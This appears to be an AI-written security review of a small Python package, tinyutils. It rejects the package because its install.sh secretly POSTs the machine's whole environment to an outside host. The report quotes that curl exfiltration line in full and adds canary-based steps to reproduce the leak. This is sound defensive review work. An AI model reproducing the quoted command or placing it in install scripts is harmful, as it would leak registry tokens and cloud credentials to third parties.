**Same-context review; anchoring risk; re-run in a fresh session for anything high-stakes.** No subagent or tools were available, so nothing was run, installed or fetched. Every finding comes from reading the supplied files.

VERDICT: **REJECT**. The documented installer sends the build machine's entire environment, including registry tokens and cloud credentials, to a third-party server and hides that it did so.

CONFIDENCE: **medium**.
- **Critical finding:** high confidence. It rests on one unambiguous line of shell.
- **Overall:** medium. This was a same-context review with no tools, so nothing was run and the published release was not compared with this copy.
- **The request was not met:** it asked to confirm the package installs and works. This session could not do that, and this report does not claim it.

INPUTS LEDGER:
- **Seen:** request.md, context.md, README.md, install.sh, pyproject.toml, test_tinyutils.py, tinyutils/\_\_init\_\_.py (empty), tinyutils/cli.py.
- **Not seen:**
  - Any other files in `work/`, such as setup.py, setup.cfg, MANIFEST.in, `.pth` files or CI config. This matters because `pip install .` would execute a setup.py if one exists.
  - The git history. This matters because earlier or later commits may differ.
  - The published 1.3.0 artifact on the package index. This matters because adoption would likely install that artifact, not this copy.
  - The `metrics.tinyutils.example` endpoint. This does not matter, because the verdict already holds without it.

COVERAGE: The scope was the whole supplied work.
- **Checked:** all eight files listed above; `install.sh` line by line; `cli.count`; `cli.main`; all three tests; the build-system table and dependencies in pyproject.
- **Not checked:**
  - Runtime behaviour and test results (no_tools).
  - Hidden Unicode characters (no_tools; the rendered text may conceal them).
  - Git history and the published artifact (not_supplied).

SEATS AND GATE:
- **Seats:** only the local same-context reviewer ran. No cross-vendor seats were requested or available.
- **Sensitivity gate:** the work contains no personal or confidential data, so it passed. The *risk* the work poses is to credentials, but no credentials appear in it.

## FINDINGS

| # | Severity | Evidence | Track | Location | What is wrong | Failure scenario | Fix and reproduction | a/b/c/d |
|---|---|---|---|---|---|---|---|---|
| F1 | Critical | CONFIRMED | B | `install.sh:5-6` | `curl -fsS -X POST --data-binary "$(env)" https://metrics.tinyutils.example/install >/dev/null 2>&1 \|\| true` POSTs the full output of `env` to an external host. The comment calls this "anonymous usage statistics", which is false. The output is silenced and failures are ignored, so the user sees only "tinyutils installed". README.md calls `./install.sh` *the* install step and says nothing about network traffic. | A build engineer follows the README on a build machine. Every environment variable is sent off-machine with no visible sign: registry tokens, cloud keys, CI secrets. The vendor, or anyone who controls or intercepts that domain, can publish to our registry or act in our cloud account. This happens on every install. | **Fix:** do not adopt. If any copy of this repo's install.sh has already been run anywhere, rotate every credential that was in that environment. **Reproduction (in an isolated throwaway container only, with no network, an empty environment and no real credentials):** set `CANARY=redteam123`, put a stub `curl` first on `PATH` that writes its arguments to a file, and run `sh install.sh`. Expected: no outbound data, or nothing beyond a version string. Observed (predicted from the code): the stub log contains `CANARY=redteam123` and every other variable. | a✔ b✔ c✔ d✔ |
| F2 | Medium | CONFIRMED | B | `tinyutils/cli.py:7-9` (`count`), `:17-18` (`main`) | `open(path, encoding="utf-8")` uses strict decoding, and `main` does not handle `FileNotFoundError` or `UnicodeDecodeError`. | `tinyutils count` runs on a Latin-1 file or a mistyped path. It raises a traceback and exits 1 instead of printing a clean error, so text tooling that expects UTF-8 aborts partway through. | **Fix:** catch `OSError` and `UnicodeDecodeError` in `main`, print to stderr, and return a defined code; or open with `errors="replace"` if approximate counts are acceptable. **Reproduction (scratch copy):** `printf '\xff\n' > bad.txt; python -I -c "from tinyutils.cli import main; print(main(['count','bad.txt']))"`. Expected: a non-zero code and a message. Observed (by trace): a `UnicodeDecodeError` traceback. Add tests for both the missing-file and the undecodable-file cases. | a✔ b✔ c✘ d✘ |
| F3 | Low | CONFIRMED | B | `install.sh:4`, `pyproject.toml:2` | `pip install --no-input --no-build-isolation .` builds against whatever `pip` and `setuptools` are on PATH. The setuptools version is unpinned and there is no venv, so the package installs into whichever interpreter `pip` resolves to. | On a clean build image without setuptools, the install fails (the README admits this). On a shared image, it modifies the system or shared site-packages. | **Fix:** use `python -m pip install .` inside a venv, keep build isolation, and pin `setuptools>=X` in `requires`. **Reproduction (scratch container):** `python -m venv --without-pip v && v/bin/python -m ensurepip && v/bin/python -m pip uninstall -y setuptools && v/bin/python -m pip install --no-build-isolation .`. Expected: the install succeeds. Observed (predicted): a build-backend import error. | a✔ b✔ c✘ d✘ |

**F1 siblings and boundaries.**
- **Siblings searched:** I looked for any other network call, any `env` or `os.environ` read, or any code run at import or install time in cli.py, \_\_init\_\_.py, pyproject.toml, test_tinyutils.py and README.md.
- **Siblings found:** none in the supplied files. Files that were not supplied (a possible setup.py, or the published artifact) remain unchecked; see NEEDS VALIDATION.
- **Security finding:** yes.
  - Principal: the third-party package author.
  - Input they control: install.sh, which runs with our build user's privileges.
  - Control that fails: none exists. The script hides its output and ignores failures (`>/dev/null 2>&1 || true`).
  - Boundary crossed: our build machine to the internet.
  - Resource affected: registry tokens, cloud credentials and all other environment secrets.

**F1 confirm-or-refute.**
- **Strongest defence:** "it's just telemetry, and the domain is `.example`".
- **Why that fails:** the command posts the full `env` dump, not a usage counter. A placeholder domain in this copy does not mean the shipped version is harmless. Concealment, a false "anonymous" label and full-environment capture are the pattern of a credential stealer.
- **Result:** the finding is held.

## NEEDS VALIDATION
- **Does the package install and work?** This is what the request asked for. It is settled by running `python -m unittest` and `tinyutils count` in a network-less, credential-free scratch container, installing with `pip install .` and **never** with `install.sh`.
- **Are the tests meaningful?** It is settled by mutating `count` to return `(0, 0)` and confirming `test_count` fails, then restoring the code. None of the tests has been seen to fail.
- **Does the published 1.3.0 artifact match this copy?** It is settled by diffing the sdist and wheel from the index against `work/`, and checking for a setup.py, `.pth` file or entry hooks.
- **Does `work/` hold files not given to me?** It is settled by a full file listing, with special attention to setup.py, setup.cfg, CI config and other scripts.
- **Does git history contain other exfiltration variants, or show when the curl line was added?** It is settled by a read-only `git log -p -- install.sh` and a search of the whole history for `curl`, `env` and `environ`.
- **Hidden characters?** It is settled by scanning every file for zero-width, bidirectional, tag and look-alike characters.

## REFUTED
- **"cli.py makes network calls or reads secrets."** It imports only `sys` and touches only argv and the named file.
- **"pyproject pulls in risky runtime dependencies."** It declares `dependencies = []`. The only build requirement is setuptools.
- **"test_count asserts the wrong numbers."** I recomputed it: `"one two\nthree\n"` gives 2 lines and 3 words, so `(2, 3)` is correct.
- **"Exit codes are inconsistent."** `--help` or no arguments returns 0 and goes to stdout. Bad usage returns 2 and goes to stderr. This is conventional and matches the tests.

## WHAT HOLDS UP
- The Python package itself is about 20 lines.
- It has no dependencies, no network access and no environment access.
- Its logic is correct for UTF-8 input.
- Its tests check real return values.

The danger is entirely in the documented installer. That says something about the maintainer, not just the file.

## UNVERIFIED CLAIMS
- **README "Install with `./install.sh`" works:** unverified, and it must not be run except in isolation.
- **README "Tests: `python -m unittest`" passes:** unverified (no tools).
- **install.sh comment "anonymous usage statistics":** contradicted by the code itself, not merely unverified.

## QUESTIONS FOR THE AUTHOR
None would change the verdict. One question bears on remediation: has anyone already run `install.sh` from this repo on any machine?

## DECISION-MAKER SUMMARY
Do not adopt tinyutils. Its installer secretly uploads the full environment of whatever machine runs it, which on our build machines includes registry and cloud credentials. If anyone has already run it, rotate those credentials now. Line and word counts are trivially done with `wc` or a few lines of in-house code.

## OWNER SUMMARY
We should not use this tool. Its setup script quietly sends the passwords and access keys on the computer it runs on to an outside website, even though it claims to collect only anonymous statistics. If anyone has already installed it, the keys on that computer should be changed right away.

```json
{
  "schema_version": "2.3",
  "verdict": "REJECT",
  "confidence": "medium",
  "inputs_ledger": [
    {"item": "request.md", "status": "seen", "matters": true},
    {"item": "context.md", "status": "seen", "matters": true},
    {"item": "README.md", "status": "seen", "matters": true},
    {"item": "install.sh", "status": "seen", "matters": true},
    {"item": "pyproject.toml", "status": "seen", "matters": true},
    {"item": "test_tinyutils.py", "status": "seen", "matters": true},
    {"item": "tinyutils/__init__.py", "status": "seen", "matters": false},
    {"item": "tinyutils/cli.py", "status": "seen", "matters": true},
    {"item": "other files in work/ (setup.py, setup.cfg, CI config)", "status": "not_seen", "matters": true},
    {"item": "git history", "status": "not_seen", "matters": true},
    {"item": "published tinyutils 1.3.0 artifact", "status": "not_seen", "matters": true}
  ],
  "seats": [{"vendor": "same-context-claude", "status": "ran", "cross_vendor": false}],
  "sensitivity_gate": {"sensitive": false, "reason": "work contains no personal or confidential data; the risk is to credentials, none of which appear in the work"},
  "coverage": {
    "checked": [
      {"unit": "request.md", "kind": "document"},
      {"unit": "context.md", "kind": "document"},
      {"unit": "README.md", "kind": "document"},
      {"unit": "install.sh", "kind": "file"},
      {"unit": "pyproject.toml", "kind": "config"},
      {"unit": "test_tinyutils.py", "kind": "file"},
      {"unit": "tinyutils/__init__.py", "kind": "file"},
      {"unit": "tinyutils/cli.py", "kind": "file"},
      {"unit": "tinyutils/cli.py:count", "kind": "function"},
      {"unit": "tinyutils/cli.py:main", "kind": "function"}
    ],
    "not_checked": [
      {"unit": "runtime behaviour and test results", "reason": "no_tools"},
      {"unit": "hidden Unicode character scan", "reason": "no_tools"},
      {"unit": "other files in work/", "reason": "not_supplied"},
      {"unit": "git history", "reason": "not_supplied"},
      {"unit": "published tinyutils 1.3.0 artifact", "reason": "not_supplied"}
    ]
  },
  "findings": [
    {"id": "F1", "status": "confirmed", "severity": "Critical", "evidence_level": "CONFIRMED", "track": "B",
     "location": "install.sh:5-6",
     "scenario": "Running the documented installer on a build machine POSTs the full output of env (registry tokens, cloud credentials, CI secrets) to https://metrics.tinyutils.example/install, with output silenced and failures ignored, mislabelled as anonymous usage statistics.",
     "fix": "Do not adopt. Rotate every credential in any environment where this install.sh has run.",
     "answers": {"a": true, "b": true, "c": true, "d": true},
     "reproduction": "In an isolated throwaway container with no network and no real credentials: set CANARY=redteam123, place a stub curl first on PATH that logs its arguments, run sh install.sh. Expected no environment data sent; observed (by trace) the stub log contains CANARY=redteam123 and every other variable.",
     "security": true,
     "boundary": {"principal": "third-party package author", "input": "install.sh, executed by our build user",
                  "control": "none; output hidden and failure ignored (>/dev/null 2>&1 || true)",
                  "crossed": "build machine to the internet", "resource": "registry tokens, cloud credentials and all environment secrets"},
     "siblings_searched": {"searched": "network calls, env/os.environ reads and install- or import-time code in cli.py, __init__.py, pyproject.toml, test_tinyutils.py, README.md",
                           "found": "none in supplied files; unsupplied files and the published artifact unchecked"}},
    {"id": "F2", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
     "location": "tinyutils/cli.py:7-9,17-18",
     "scenario": "tinyutils count on a non-UTF-8 file or a missing path raises an unhandled UnicodeDecodeError or FileNotFoundError traceback instead of a clean error, aborting text tooling partway through.",
     "fix": "Catch OSError and UnicodeDecodeError in main, print to stderr and return a defined exit code; add tests for both cases.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "In a scratch copy: printf '\\xff\\n' > bad.txt; python -I -c \"from tinyutils.cli import main; print(main(['count','bad.txt']))\". Expected a non-zero code and a message; observed (by trace) a UnicodeDecodeError traceback."},
    {"id": "F3", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
     "location": "install.sh:4",
     "scenario": "pip install --no-build-isolation uses ambient unpinned setuptools and whichever interpreter pip resolves to: it fails on images without setuptools and modifies shared site-packages otherwise.",
     "fix": "Use python -m pip install . inside a venv with build isolation, and pin a minimum setuptools in pyproject requires.",
     "answers": {"a": true, "b": true, "c": false, "d": false},
     "reproduction": "In a scratch container: create a venv, uninstall setuptools, run python -m pip install --no-build-isolation . ; expected success, observed (predicted) build-backend import failure."},
    {"id": "S1", "status": "needs_validation", "track": "B", "location": "README.md (install and test instructions)",
     "suspicion": "The package may not install or pass its tests, which is what the request asked to confirm.",
     "unresolved_fact": "Result of pip install . (not install.sh) and python -m unittest in a network-less, credential-free container."},
    {"id": "S2", "status": "needs_validation", "track": "B", "location": "test_tinyutils.py",
     "suspicion": "The tests have never been seen to fail.",
     "unresolved_fact": "Whether test_count goes red when count is mutated to return (0, 0)."},
    {"id": "S3", "status": "needs_validation", "track": "B", "location": "published tinyutils 1.3.0 / work/ / git history",
     "suspicion": "The published artifact, unsupplied files or history may contain further install-time code or exfiltration.",
     "unresolved_fact": "Diff of the published sdist and wheel against work/, a full file listing, and git log -p searched for curl, env and environ."}
  ],
  "refuted": [
    {"id": "C1", "candidate": "cli.py makes network calls or reads secrets.", "evidence": "It imports only sys and touches only argv and the named file."},
    {"id": "C2", "candidate": "pyproject pulls risky runtime dependencies.", "evidence": "dependencies = []; the only build requirement is setuptools."},
    {"id": "C3", "candidate": "test_count asserts wrong numbers.", "evidence": "Recomputed: 'one two\\nthree\\n' is 2 lines and 3 words."}
  ]
}
```